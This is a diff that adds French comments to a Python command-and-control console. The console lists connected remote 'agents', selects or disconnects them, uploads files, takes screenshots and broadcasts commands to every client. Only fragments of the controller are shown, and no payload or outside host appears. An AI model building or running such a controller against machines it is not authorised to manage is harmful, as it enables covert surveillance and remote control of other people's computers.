@@ -168,6 +168,7 @@ def send_to_agent(payload, label=None):
 #Affichage des reponses
 
 def afficher_reponse(resp):
+    # affiche proprement ce que renvoie le client
     status = resp.get("status", "?")
     if status == "error":
         print(f"Erreur agent: {resp.get('message', '?')}")
@@ -222,6 +223,7 @@ def cmd_help():
 """)
 
 def cmd_agents():
+    # affiche la liste des agents connectés
     with agents_lock:
         if not agents:
             print("Aucun agent connecté")
@@ -234,6 +236,7 @@ def cmd_agents():
     print()
 
 def cmd_use(arg):
+    # pour pouvoir selectionner un agent
     global current_agent
     try:
         aid = int(arg)
@@ -249,6 +252,7 @@ def cmd_use(arg):
     print(f"Agent #{aid} sélectionné")
 
 def cmd_kill(arg):
+    # forcer la deconnexion d'un client
     try:
         aid = int(arg)
     except ValueError:
@@ -261,6 +265,7 @@ def cmd_kill(arg):
     print(f"Agent #{aid} déconnecté")
 
 def cmd_upload(arg):
+    # envoie un fichier local au client
     if not current_agent:
         print("Aucun agent sélectionné (use <id>)")
         return
@@ -287,6 +292,7 @@ def cmd_upload(arg):
 
 
 def cmd_screenshot():
+    
     #Envoie screenshot et sauvegarde le png
     if not current_agent:
         print("Aucun agent sélectionné (use <id>)")
@@ -312,6 +318,7 @@ def cmd_screenshot():
 
 
 def cmd_broadcast(arg):
+    # permet d'envoyer en mass une commande a tous les clients connectés 
     if not arg:
         print("Usage: broadcast <commande> [args]")
         return
@@ -352,6 +359,7 @@ def cmd_broadcast(arg):
 #Boucle principale
 
 def main():
+    # lance le listener dans un thread
     listener = threading.Thread(target=start_listener, daemon=True)
     listener.start()
 
